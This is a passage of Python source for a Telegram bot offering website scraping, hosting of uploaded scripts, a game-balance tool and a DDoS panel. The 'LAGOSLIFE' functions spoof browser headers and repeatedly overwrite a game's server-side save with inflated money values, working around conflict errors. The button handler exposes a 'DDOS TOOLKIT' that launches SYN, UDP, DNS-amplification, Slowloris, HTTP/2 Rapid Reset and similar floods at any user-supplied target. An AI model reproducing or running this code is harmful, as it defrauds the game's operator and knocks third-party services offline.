            f"Pages: <b>{result['pages']}</b>\n"
            f"Assets: <b>{result['asset_ok']}</b> ok · {result['asset_fail']} fail\n"
            f"Zip: <b>{size_mb:.2f} MB</b>"
            f"{fail_preview}"
        )

        if size_mb > SCRAPER_MAX_ZIP_MB:
            try:
                bot_sync(bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg_id,
                    text=summary + f"\n\n⚠️ Zip over {SCRAPER_MAX_ZIP_MB}MB — text only.",
                    parse_mode="HTML",
                ), timeout=30)
            except Exception:
                pass
            try:
                with open(result["md_path"], "rb") as f:
                    bot_sync(bot.send_document(chat_id=chat_id, document=f, caption="Markdown"), timeout=60)
                with open(result["txt_path"], "rb") as f:
                    bot_sync(bot.send_document(chat_id=chat_id, document=f, caption="Text"), timeout=60)
            except Exception:
                pass
        else:
            try:
                if mode in ("zip", "both"):
                    with open(zip_path, "rb") as f:
                        bot_sync(bot.send_document(
                            chat_id=chat_id, document=f,
                            caption=(
                                f"📦 {zip_path.name}\n{result['final_url']}\n"
                                f"pages={result['pages']} assets={result['asset_ok']}"
                            ),
                        ), timeout=90)
                if mode in ("md", "both"):
                    with open(result["md_path"], "rb") as f:
                        bot_sync(bot.send_document(chat_id=chat_id, document=f, caption="Markdown"), timeout=60)
                if mode in ("txt", "both"):
                    with open(result["txt_path"], "rb") as f:
                        bot_sync(bot.send_document(chat_id=chat_id, document=f, caption="Plain text"), timeout=60)
            except Exception:
                pass
            try:
                bot_sync(bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg_id, text=summary,
                    parse_mode="HTML", reply_markup=scraper_job_kb(job_id, running=False),
                ), timeout=30)
            except Exception:
                pass

        scraper_history[chat_id].appendleft({
            "url": result["final_url"], "ts": int(time.time()),
            "pages": result["pages"], "assets": result["asset_ok"],
        })
        with scraper_lock:
            if chat_id in scraper_jobs:
                scraper_jobs[chat_id]["result"] = {
                    "work_dir": str(work), "zip": str(zip_path),
                    "final_url": result["final_url"],
                    "md": str(result["md_path"]), "txt": str(result["txt_path"]),
                    "shot": str(shot_path) if shot_path.exists() else "",
                }
    except requests.HTTPError as e:
        code = e.response.status_code if e.response is not None else "?"
        try:
            bot_sync(bot.edit_message_text(
                chat_id=chat_id, message_id=status_msg_id, text=f"❌ HTTP {code}"
            ), timeout=30)
        except Exception:
            pass
    except Exception as e:
        try:
            bot_sync(bot.edit_message_text(
                chat_id=chat_id, message_id=status_msg_id,
                text=f"❌ {html_lib.escape(str(e)[:220])}", parse_mode="HTML",
            ), timeout=30)
        except Exception:
            pass
    finally:
        try:
            if tmp.exists():
                # keep tmp until job result buttons used; cleanup old leftovers only
                pass
        except Exception:
            pass


async def scraper_start_job(bot, chat_id, url):
    """Async entry — must be awaited from handlers."""
    now = time.time()
    if now - scraper_cooldown.get(chat_id, 0) < 2:
        await bot.send_message(chat_id=chat_id, text="⏳ Wait 2s between jobs.")
        return
    scraper_cooldown[chat_id] = now
    with scraper_lock:
        cur = scraper_jobs.get(chat_id)
        if cur and cur.get("result") is None:
            await bot.send_message(chat_id=chat_id, text="Job already running. Cancel first.")
            return
        prev = scraper_jobs.pop(chat_id, None)
    if prev and prev.get("tmp"):
        shutil.rmtree(prev["tmp"], ignore_errors=True)
    try:
        msg = await bot.send_message(
            chat_id=chat_id,
            text=f"⏳ Queued\n<code>{html_lib.escape(url)}</code>",
            parse_mode="HTML",
        )
    except Exception as e:
        await bot.send_message(chat_id=chat_id, text=f"❌ Could not start job: {str(e)[:120]}")
        return
    threading.Thread(
        target=scraper_run_job,
        args=(bot, chat_id, url, msg.message_id),
        daemon=True,
    ).start()


# ─────────────────────────────────────────────
#  LAGOSLIFE ENGINE
# ─────────────────────────────────────────────

def make_session():
    profile = random.choice(UA_POOL)
    s = requests.Session()
    headers = {
        "User-Agent": profile["ua"],
        "Origin": BASE,
        "Referer": BASE + "/",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    if profile["sec-ch-ua"]:
        headers["Sec-Ch-Ua"] = profile["sec-ch-ua"]
        headers["Sec-Ch-Ua-Mobile"] = "?0"
        headers["Sec-Ch-Ua-Platform"] = '"Windows"' if "Windows" in profile["ua"] else '"macOS"'
    s.headers.update(headers)
    return s

def adaptive_delay(successes):
    base = 0.7 + min(successes * 0.02, 1.1)
    time.sleep(random.uniform(base, base + 0.5))

def raw(session, path, method, body_dict=None):
    url = BASE + path
    try:
        if method == "GET":
            res = session.get(url, allow_redirects=False, timeout=14)
        elif method == "POST":
            res = session.post(url, json=body_dict, allow_redirects=False, timeout=14)
        elif method == "PUT":
            res = session.put(url, json=body_dict, allow_redirects=False, timeout=14)
        else:
            return {"status": 400, "json": None}
        try:
            data = res.json()
        except:
            try:
                data = json.loads(res.content.decode("utf-8", errors="ignore"))
            except:
                data = res.text
        return {"status": res.status_code, "json": data}
    except Exception as err:
        return {"status": 500, "json": str(err)}

def read_save(session):
    res = raw(session, "/api/save", "GET")
    if res["status"] != 200 or not isinstance(res["json"], dict):
        return None
    return res["json"]

def set_money_with_retry(session, v, retries=4):
    for attempt in range(retries):
        cur = read_save(session)
        if not cur or "game" not in cur:
            return {"status": 500, "stored": None}
        g = json.loads(json.dumps(cur["game"]))
        g["money"] = v
        r = raw(session, "/api/save", "PUT", {"game": g, "base": cur.get("updatedAt")})
        time.sleep(0.4)
        back = read_save(session)
        stored = back.get("game", {}).get("money") if isinstance(back, dict) else None
        if r["status"] == 409:
            time.sleep(0.9 + attempt * 0.5)
            continue
        return {"status": r["status"], "stored": stored}
    return {"status": 409, "stored": None}

def progression_loop(user_id, status_chat_id, status_msg_id):
    state = user_sessions.get(user_id)
    if not state:
        return
    session = state["session"]
    amount = state.get("amount", 50000)
    target = state.get("target", 0)
    cycle = 0
    total_accepted = 0
    total_added = 0
    last_bal = 0
    consecutive_409 = 0
    force_small = False
    start_time = time.time()

    cur = read_save(session)
    if cur and "game" in cur:
        last_bal = cur["game"].get("money", 0)

    edit_queue.put((status_chat_id, status_msg_id, live_status(0, last_bal, 0, amount, 0, target, extra="Initializing...")))

    while state.get("running"):
        try:
            cur = read_save(session)
            if not cur or "game" not in cur:
                edit_queue.put((status_chat_id, status_msg_id, live_status(cycle, last_bal, total_accepted, amount, total_added, target, extra="Fetch failed")))
                time.sleep(2.5)
                continue
            bal = cur["game"].get("money", 0)
            last_bal = bal
            if target > 0 and bal >= target:
                state["running"] = False
                edit_queue.put((status_chat_id, status_msg_id, live_status(cycle, last_bal, total_accepted, amount, total_added, target, running=False, extra="TARGET REACHED")))
                edit_queue.put((status_chat_id, None, card("TARGET REACHED", f"  Balance : ₦{bal:,}\n  Target  : ₦{target:,}")))
                break
            write_amount = min(120000, amount) if (force_small or amount > 500000) else amount
            new_bal = last_bal + write_amount
            r = set_money_with_retry(session, new_bal)
            if r["status"] == 409:
                consecutive_409 += 1
                if consecutive_409 >= 3:
                    force_small = True
                    edit_queue.put((status_chat_id, status_msg_id, live_status(cycle, last_bal, total_accepted, amount, total_added, target, extra="Safe mode (409)")))
                    time.sleep(5)
                    consecutive_409 = 0
                continue
            consecutive_409 = 0
            cycle += 1
            if (r["status"] == 200 and r["stored"] == new_bal) or (isinstance(r["stored"], (int, float)) and r["stored"] > last_bal):
                total_accepted += 1
                gained = (r["stored"] - last_bal) if isinstance(r["stored"], (int, float)) else write_amount
                total_added += max(0, gained)
                last_bal = r["stored"] if r["stored"] else new_bal
                if force_small and total_accepted % 5 == 0:
                    force_small = False
                extra = ""
            else:
                extra = f"Sync {r['status']}"
            edit_queue.put((status_chat_id, status_msg_id, live_status(cycle, last_bal, total_accepted, amount, total_added, target, extra=extra)))
            adaptive_delay(total_accepted)
        except Exception as e:
            edit_queue.put((status_chat_id, status_msg_id, live_status(cycle, last_bal, total_accepted, amount, total_added, target, extra=f"Err: {str(e)[:22]}")))
            time.sleep(2)
    uptime = int(time.time() - start_time)
    edit_queue.put((status_chat_id, status_msg_id, live_status(cycle, last_bal, total_accepted, amount, total_added, target, running=False)))
    edit_queue.put((status_chat_id, None, card("PROCESS HALTED", f"  Accepted : {total_accepted}\n  Injected : ₦{total_added:,}\n  Uptime   : {uptime}s")))

async def edit_worker(app):
    while True:
        try:
            chat_id, msg_id, text = edit_queue.get_nowait()
        except queue.Empty:
            await asyncio.sleep(0.25)
            continue
        try:
            if msg_id is None:
                await app.bot.send_message(chat_id=chat_id, text=text)
            else:
                await app.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text)
        except:
            pass

async def play_hack_animation(bot, chat_id):
    try:
        msg = await bot.send_message(chat_id=chat_id, text=HACK_FRAMES[0])
        for frame in HACK_FRAMES[1:]:
            await asyncio.sleep(0.65)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=frame)
            except:
                break
        await asyncio.sleep(0.8)
        try:
            await bot.delete_message(chat_id=chat_id, message_id=msg.message_id)
        except:
            pass
    except:
        pass

# ─────────────────────────────────────────────
#  HOSTING ENGINE
# ─────────────────────────────────────────────

# Only real third-party packages — never try to pip install stdlib
KNOWN_PACKAGES = {
    "telegram": "python-telegram-bot",
    "telebot": "pyTelegramBotAPI",
    "pyrogram": "pyrogram",
    "aiogram": "aiogram",
    "requests": "requests",
    "aiohttp": "aiohttp",
    "httpx": "httpx",
    "bs4": "beautifulsoup4",
    "beautifulsoup4": "beautifulsoup4",
    "PIL": "Pillow",
    "pillow": "Pillow",
    "cv2": "opencv-python",
    "numpy": "numpy",
    "pandas": "pandas",
    "flask": "flask",
    "fastapi": "fastapi",
    "uvicorn": "uvicorn",
    "selenium": "selenium",
    "playwright": "playwright",
    "discord": "discord.py",
    "pytz": "pytz",
    "dateutil": "python-dateutil",
    "dotenv": "python-dotenv",
    "cryptography": "cryptography",
    "pycryptodome": "pycryptodome",
    "Crypto": "pycryptodome",
}

def scan_python_deps(file_path):
    """Return only installable third-party packages found in the file."""
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        imports = re.findall(r"^(?:from|import)\s+([a-zA-Z0-9_]+)", content, re.MULTILINE)
        found = []
        for name in set(imports):
            if name in KNOWN_PACKAGES:
                pkg = KNOWN_PACKAGES[name]
                if pkg not in found:
                    found.append(pkg)
        return found
    except:
        return []

def get_bot_cmd(bot):
    main = os.path.join(bot["path"], bot["main_file"])
    if bot["kind"] == "python":
        return [sys.executable, main]
    return ["node", "--max-old-space-size=512", main]

def start_bot_process(bot_id):
    b = hosted_bots.get(bot_id)
    if not b:
        return False, "Bot not found"
    if b.get("proc") and b["proc"].poll() is None:
        return False, "Already running"
    log_path = os.path.join(b["path"], "bot.log")
    log_file = open(log_path, "a", encoding="utf-8", errors="ignore")
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"
    for k, v in b.get("env", {}).items():
        env[k] = str(v)
    if b.get("token"):
        env["BOT_TOKEN"] = b["token"]
        env["TELEGRAM_TOKEN"] = b["token"]
    try:
        cmd = get_bot_cmd(b)
        proc = subprocess.Popen(
            cmd,
            stdout=log_file,
            stderr=log_file,
            text=True,
            start_new_session=True,
            env=env,
            cwd=b["path"],
            encoding="utf-8",
            errors="replace"
        )
        b["proc"] = proc
        b["log_path"] = log_path
        b["started_at"] = time.time()
        return True, "Started"
    except Exception as e:
        try:
            log_file.close()
        except:
            pass
        return False, str(e)[:80]

def stop_bot_process(bot_id):
    b = hosted_bots.get(bot_id)
    if not b:
        return False, "Bot not found"
    if not b.get("proc") or b["proc"].poll() is not None:
        return False, "Not running"
    try:
        b["proc"].terminate()
        try:
            b["proc"].wait(timeout=5)
        except:
            b["proc"].kill()
        b["proc"] = None
        return True, "Stopped"
    except Exception as e:
        return False, str(e)[:80]

async def create_hosted_bot(context, owner_id, file_id, file_name, user_info=""):
    bot_id = str(uuid.uuid4())[:8]
    bot_path = os.path.join(BOTS_DIR, f"{owner_id}_{bot_id}")
    os.makedirs(bot_path, exist_ok=True)
    main_file = file_name
    kind = "python" if file_name.endswith(".py") else "javascript"

    try:
        msg = await context.bot.send_message(
            chat_id=owner_id,
            text=f"⚡ Creating bot `{file_name}`...",
            parse_mode="Markdown"
        )

        # Download file (this was timing out on slow Render free network)
        try:
            new_file = await asyncio.wait_for(
                context.bot.get_file(file_id),
                timeout=30
            )
            local_path = os.path.join(bot_path, main_file)
            await asyncio.wait_for(
                new_file.download_to_drive(local_path),
                timeout=60
            )
        except asyncio.TimeoutError:
            await msg.edit_text("❌ Failed: Download timed out. Try again.")
            return None
        except Exception as e:
            await msg.edit_text(f"❌ Failed download: {str(e)[:80]}")
            return None

        # Light auto-install — only known third-party packages, short timeout
        if kind == "python":
            deps = scan_python_deps(local_path)
            if deps:
                await msg.edit_text(f"📦 Installing {len(deps)} package(s)...")
                for pkg in deps:
                    try:
                        # Run in thread so we don't block the event loop
                        await asyncio.get_event_loop().run_in_executor(
                            None,
                            lambda p=pkg: subprocess.run(
                                [sys.executable, "-m", "pip", "install", p, "--no-cache-dir", "-q"],
                                capture_output=True,
                                timeout=45
                            )
                        )
                    except Exception:
                        pass  # skip failed packages, user can install later via Install Pkg

        hosted_bots[bot_id] = {
            "owner_id": owner_id,
            "name": file_name,
            "path": bot_path,
            "main_file": main_file,
            "kind": kind,
            "created": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
            "env": {},
            "token": "",
            "proc": None,
            "log_path": os.path.join(bot_path, "bot.log"),
            "started_at": None
        }
        save_hosts()

        # auto start
        ok, info = start_bot_process(bot_id)
        status = "🟢 Running" if ok else f"🔴 {info}"
        await msg.edit_text(
            f"✅ Bot created\n\n"
            f"Name : `{file_name}`\n"
            f"ID   : `{bot_id}`\n"
            f"Status: {status}\n\n"
            f"Use MY BOTS to control it.",
            parse_mode="Markdown"
        )
        for aid in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=aid,
                    text=f"🚀 New hosted bot\nUser: {user_info}\nID: `{owner_id}`\nBot: `{file_name}` (`{bot_id}`)",
                    parse_mode="Markdown"
                )
            except:
                pass
        return bot_id
    except Exception as e:
        err = str(e)[:100]
        try:
            await context.bot.send_message(chat_id=owner_id, text=f"❌ Failed: {err}")
        except:
            pass
        return None

# ─────────────────────────────────────────────
#  HANDLERS
# ─────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    track_user(user_id)
    kb = main_menu(user_id)
    caption = welcome_caption()
    if update.message:
        if welcome_pic_id:
            try:
                await update.message.reply_photo(photo=welcome_pic_id, caption=caption, reply_markup=kb)
                return
            except:
                pass
        await update.message.reply_text(caption, reply_markup=kb)
    else:
        try:
            await update.callback_query.edit_message_text(caption, reply_markup=kb)
        except Exception:
            try:
                await update.callback_query.edit_message_caption(caption=caption, reply_markup=kb)
            except Exception:
                await update.callback_query.message.reply_text(caption, reply_markup=kb)

async def leave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat = update.effective_chat
    if not is_admin(user_id):
        return
    if chat.type not in ("group", "supergroup"):
        await update.message.reply_text(card("INFO", "  This command only works in groups"))
        return
    try:
        await update.message.reply_text(card("LEAVE", "  Leaving this group..."))
        await context.bot.leave_chat(chat.id)
    except Exception as e:
        await update.message.reply_text(card("ERROR", f"  Could not leave\n  {str(e)[:40]}"))

async def safe_edit(query, text, reply_markup=None):
    try:
        await query.edit_message_text(text=text, reply_markup=reply_markup)
        return
    except Exception:
        pass
    try:
        await query.edit_message_caption(caption=text, reply_markup=reply_markup)
        return
    except Exception:
        pass
    try:
        await query.message.reply_text(text=text, reply_markup=reply_markup)
    except Exception:
        pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    user_id = query.from_user.id
    data = query.data

    if data == "back_main":
        await safe_edit(query, welcome_caption(), main_menu(user_id))
        return

    # ── MY BOTS ──
    if data == "my_bots":
        my = [(bid, b) for bid, b in hosted_bots.items() if b["owner_id"] == user_id or is_admin(user_id)]
        if not my:
            await safe_edit(query, card("MY BOTS", "  No bots yet.\n  Press NEW BOT to upload."), main_menu(user_id))
            return
        keyboard = []
        for bid, b in my:
            alive = b.get("proc") and b["proc"].poll() is None
            icon = "🟢" if alive else "🔴"
            keyboard.append([InlineKeyboardButton(f"{icon} {b['name']}", callback_data=f"bopen_{bid}")])
        keyboard.append([InlineKeyboardButton("➕ NEW BOT", callback_data="new_bot")])
        keyboard.append([InlineKeyboardButton("« BACK", callback_data="back_main")])
        await safe_edit(query, banner("MY BOTS") + f"\n\n  Total: {len(my)}", InlineKeyboardMarkup(keyboard))
        return

    if data == "new_bot":
        waiting_for[user_id] = "new_bot"
        await safe_edit(query, card("NEW BOT", "  Send your .py or .js file now\n  It will be hosted with full control panel"), back_only())
        return

    if data.startswith("bopen_"):
        bot_id = data.replace("bopen_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await safe_edit(query, "Bot not found", main_menu(user_id))
            return
        text = f"BOT CONTROL\n\n{bot_status_card(bot_id)}"
        await safe_edit(query, text, bot_control_panel(bot_id))
        return

    # ── BOT CONTROL ACTIONS ──
    if data.startswith("bstart_"):
        bot_id = data.replace("bstart_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        ok, info = start_bot_process(bot_id)
        await query.answer(info)
        text = f"BOT CONTROL\n\n{bot_status_card(bot_id)}"
        await safe_edit(query, text, bot_control_panel(bot_id))
        return

    if data.startswith("brestart_"):
        bot_id = data.replace("brestart_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        stop_bot_process(bot_id)
        await asyncio.sleep(1)
        ok, info = start_bot_process(bot_id)
        await query.answer(f"Restart: {info}")
        text = f"BOT CONTROL\n\n{bot_status_card(bot_id)}"
        await safe_edit(query, text, bot_control_panel(bot_id))
        return

    if data.startswith("blogs_"):
        bot_id = data.replace("blogs_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        log_path = b.get("log_path") or os.path.join(b["path"], "bot.log")
        if not os.path.isfile(log_path):
            await query.answer("No logs yet", show_alert=True)
            return
        try:
            with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()[-40:]
            log_text = "".join(lines)[-3500:] or "(empty)"
            await context.bot.send_message(chat_id=user_id, text=f"📜 Live Logs — {b['name']}\n\n```\n{log_text}\n```", parse_mode="Markdown")
            await query.answer("Logs sent to DM")
        except Exception as e:
            await query.answer(str(e)[:40], show_alert=True)
        return

    if data.startswith("binfo_"):
        bot_id = data.replace("binfo_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        text = f"BOT CONTROL\n\n{bot_status_card(bot_id)}"
        await safe_edit(query, text, bot_control_panel(bot_id))
        return

    if data.startswith("benv_"):
        bot_id = data.replace("benv_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        env = b.get("env", {})
        if not env:
            body = "  No env vars set\n  Send: KEY=VALUE"
        else:
            body = "\n".join(f"  {k} = {v}" for k, v in env.items())
        waiting_for[user_id] = f"env_{bot_id}"
        await safe_edit(query, card("ENV VARS", body + "\n\n  Send KEY=VALUE to add"), back_only())
        return

    if data.startswith("bpkg_"):
        bot_id = data.replace("bpkg_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        waiting_for[user_id] = f"pkg_{bot_id}"
        await safe_edit(query, card("INSTALL PKG", "  Send package name\n  Example: requests"), back_only())
        return

    if data.startswith("bclone_"):
        bot_id = data.replace("bclone_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        new_id = str(uuid.uuid4())[:8]
        new_path = os.path.join(BOTS_DIR, f"{user_id}_{new_id}")
        try:
            shutil.copytree(b["path"], new_path)
            hosted_bots[new_id] = {
                "owner_id": user_id,
                "name": b["name"] + " (clone)",
                "path": new_path,
                "main_file": b["main_file"],
                "kind": b["kind"],
                "created": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
                "env": dict(b.get("env", {})),
                "token": b.get("token", ""),
                "proc": None,
                "log_path": os.path.join(new_path, "bot.log"),
                "started_at": None
            }
            save_hosts()
            await query.answer("Cloned!")
            await safe_edit(query, card("CLONED", f"  New ID: {new_id}"), main_menu(user_id))
        except Exception as e:
            await query.answer(str(e)[:40], show_alert=True)
        return

    if data.startswith("bdl_"):
        bot_id = data.replace("bdl_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        main_path = os.path.join(b["path"], b["main_file"])
        if not os.path.isfile(main_path):
            await query.answer("File missing", show_alert=True)
            return
        try:
            with open(main_path, "rb") as f:
                await context.bot.send_document(chat_id=user_id, document=InputFile(f, filename=b["main_file"]))
            await query.answer("Sent to DM")
        except Exception as e:
            await query.answer(str(e)[:40], show_alert=True)
        return

    if data.startswith("btoken_"):
        bot_id = data.replace("btoken_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        waiting_for[user_id] = f"token_{bot_id}"
        await safe_edit(query, card("SET TOKEN", "  Send the bot token now"), back_only())
        return

    if data.startswith("bupdate_"):
        bot_id = data.replace("bupdate_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        waiting_for[user_id] = f"bupdate_{bot_id}"
        await safe_edit(query, card("UPDATE FILES", "  Send the new .py / .js file"), back_only())
        return

    if data.startswith("bfiles_"):
        bot_id = data.replace("bfiles_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        try:
            files = os.listdir(b["path"])
            body = "\n".join(f"  • {f}" for f in files[:30]) or "  (empty)"
            await safe_edit(query, card("FILE LIST", body), bot_control_panel(bot_id))
        except Exception as e:
            await query.answer(str(e)[:40], show_alert=True)
        return

    if data.startswith("bdel_"):
        bot_id = data.replace("bdel_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            await query.answer("No access", show_alert=True)
            return
        stop_bot_process(bot_id)
        try:
            shutil.rmtree(b["path"], ignore_errors=True)
        except:
            pass
        del hosted_bots[bot_id]
        save_hosts()
        await safe_edit(query, card("DELETED", f"  {b['name']} removed"), main_menu(user_id))
        return

    # ── APPROVE / REJECT ──
    if data.startswith("appr_"):
        if not is_admin(user_id):
            await query.answer("Owner only", show_alert=True)
            return
        task_id = data.replace("appr_", "")
        task = pending_files.pop(task_id, None)
        if not task:
            await safe_edit(query, "Request expired.")
            return
        await safe_edit(query, f"✅ Approved\nUser: `{task['user_id']}`\nFile: `{task['file_name']}`")
        asyncio.create_task(create_hosted_bot(context, task["user_id"], task["file_id"], task["file_name"], task.get("user_info", "")))
        return

    if data.startswith("rejc_"):
        if not is_admin(user_id):
            await query.answer("Owner only", show_alert=True)
            return
        task_id = data.replace("rejc_", "")
        task = pending_files.pop(task_id, None)
        if not task:
            await safe_edit(query, "Request expired.")
            return
        await safe_edit(query, f"❌ Rejected\nUser: `{task['user_id']}`\nFile: `{task['file_name']}`")
        try:
            await context.bot.send_message(chat_id=task["user_id"], text=f"❌ Owner rejected: `{task['file_name']}`", parse_mode="Markdown")
        except:
            pass
        return

    if data == "all_bots":
        if not is_admin(user_id):
            return
        if not hosted_bots:
            await safe_edit(query, card("ALL BOTS", "  No hosted bots"), admin_panel())
            return
        keyboard = []
        for bid, b in hosted_bots.items():
            alive = b.get("proc") and b["proc"].poll() is None
            icon = "🟢" if alive else "🔴"
            keyboard.append([InlineKeyboardButton(f"{icon} {b['name']} (u:{b['owner_id']})", callback_data=f"bopen_{bid}")])
        keyboard.append([InlineKeyboardButton("« BACK", callback_data="admin")])
        await safe_edit(query, banner("ALL HOSTED") + f"\n\n  Total: {len(hosted_bots)}", InlineKeyboardMarkup(keyboard))
        return

    # ── DDOS ──
    if data == "ddos":
        await safe_edit(query,
            card("DDOS TOOLKIT", "  11 vectors · SYN/UDP/HTTP/SSL\\n  Slowloris · DNS Amp · Multi-vector\\n  Select attack below"),
            ddos_menu())
        return

    if data == "dd_ping":
        waiting_for[user_id] = "dd_ping"
        await safe_edit(query, card("PING", "  Send target IP or URL"), back_only())
        return

    if data == "dd_res":
        report = ddos_engine.get_system_resources()
        await safe_edit(query, report, ddos_menu())
        return

    if data == "dd_status":
        s = ddos_engine.stats
        txt = (
            f"📊 *DDOS Status*\n"
            f"• Running: `{ddos_engine.running}`\n"
            f"• Target: `{ddos_engine.current_target}`\n"
            f"• Packets: `{s['packets_sent']:,}`\n"
            f"• Connections: `{s['connections']:,}`\n"
            f"• Bytes: `{s['bytes_sent']/(1024*1024):.2f} MB`\n"
            f"• Errors: `{s['errors']:,}`"
        )
        await safe_edit(query, txt, ddos_menu())
        return

    if data == "dd_stop":
        ddos_engine.running = False
        await safe_edit(query, card("STOPPED", "  Attack halted"), ddos_menu())
        return

    _DDOS_VECTOR_MAP = {
        "dd_01":    ("http",    "HTTP Flood"),
        "dd_02":    ("syn",     "SYN Flood"),
        "dd_03":    ("udp",     "UDP Flood"),
        "dd_04":    ("tcp",     "TCP Flood"),
        "dd_05":    ("dns",     "DNS Amp"),
        "dd_06":    ("icmp",    "ICMP Flood"),
        "dd_07":    ("slow",    "Slowloris"),
        "dd_08":    ("ws",      "WS Flood"),
        "dd_09":    ("ssl",     "SSL Flood"),
        "dd_10":    ("post",    "Slow POST"),
        "dd_11":    ("rudy",    "RUDY"),
        "dd_12":    ("h2reset", "HTTP/2 Rapid Reset"),
        "dd_multi": ("multi",   "Multi-vector"),
    }
    if data in _DDOS_VECTOR_MAP:
        if ddos_engine.running:
            await query.answer("Attack already running. Stop it first.", show_alert=True)
            return
        vcode, vname = _DDOS_VECTOR_MAP[data]
        needs_port = vcode not in ("http", "ws", "post", "icmp", "rudy", "h2reset")
        ddos_user_state[user_id] = {"vector": vcode, "vname": vname, "step": "target"}
        await safe_edit(query,
            card(vname, f"  Send target\n  {'IP address' if needs_port else 'URL or IP'}"),
            back_only())
        waiting_for[user_id] = "dd_input"
        return

    # ── LAGOSLIFE ──
    
    # ── Scraper menu ──
    if data == "scraper":
        await safe_edit(
            query,
            card(
                "SCRAPER",
                f"  Offline page saver\n  Zip · MD · Text · Crawl\n"
                f"  Build: {BOT_VERSION}\n  HTTP: {SCRAPER_ENGINE}",
            ),
            scraper_menu(),
        )
        return
    if data == "sc_save":
        waiting_for[user_id] = "sc_save"
        await safe_edit(query, card("SAVE URL", "  Send the page URL now"), back_only())
        return
    if data == "sc_batch":
        waiting_for[user_id] = "sc_batch"
        await safe_edit(query, card("BATCH", "  Send multiple URLs\n  (one per line)"), back_only())
        return
    if data == "sc_crawl":
        s = scraper_settings[user_id]
        await safe_edit(
            query,
            card(
                "CRAWL",
                f"  Depth now: {s['depth']}\n"
                f"  0 = single page\n"
                f"  1-8 = same-domain links\n"
                f"  10 = full site (until page cap)\n"
                f"  Cap: {SCRAPER_MAX_PAGES} pages · {SCRAPER_MAX_ASSETS} assets default",
            ),
            scraper_settings_kb(user_id),
        )
        return
    if data == "sc_full":
        s = scraper_settings[user_id]
        s["depth"] = SCRAPER_MAX_DEPTH
        s["max_assets"] = 0  # unlimited assets (still soft-capped by zip size)
        waiting_for[user_id] = "sc_save"
        await safe_edit(
            query,
            card(
                "FULL SITE",
                f"  Depth {SCRAPER_MAX_DEPTH} · assets ∞\n"
                f"  Max {SCRAPER_MAX_PAGES} same-domain pages\n"
                f"  Send the site URL now",
            ),
            back_only(),
        )
        return
    if data == "sc_settings":
        s = scraper_settings[user_id]
        body = (
            f"  Depth    : {s['depth']}\n"
            f"  Assets   : {s['max_assets'] or '∞'}\n"
            f"  Images   : {s['images']}\n"
            f"  JS/CSS   : {s['js_css']}\n"
            f"  Fonts    : {s['fonts']}\n"
            f"  Mode     : {s['mode']}\n"
            f"  Rewrite  : {s['rewrite']}\n"
            f"  Mobile   : {s['mobile']}\n"
            f"  Shot     : {s['screenshot']}\n"
            f"  Selector : {s['selector'] or '-'}\n"
            f"  Cap pages: {SCRAPER_MAX_PAGES}"
        )
        await safe_edit(query, card("SCRAPER SETTINGS", body), scraper_settings_kb(user_id))
        return
    if data == "sc_history":
        hist = list(scraper_history[user_id])
        if not hist:
            await safe_edit(query, card("HISTORY", "  Empty"), scraper_menu())
            return
        lines = []
        kb_rows = []
        for i, h in enumerate(hist[:10]):
            ts = time.strftime("%m-%d %H:%M", time.localtime(h["ts"]))
            lines.append(f"  {i+1}. {h['url'][:40]} · {h.get('pages','?')}p · {ts}")
            kb_rows.append([InlineKeyboardButton(f"↺{i+1}", callback_data=f"schist:{i}")])
        kb_rows.append([InlineKeyboardButton("« Scraper", callback_data="scraper")])
        await safe_edit(query, card("HISTORY", "\n".join(lines)), InlineKeyboardMarkup(kb_rows))
        return
    if data == "sc_help":
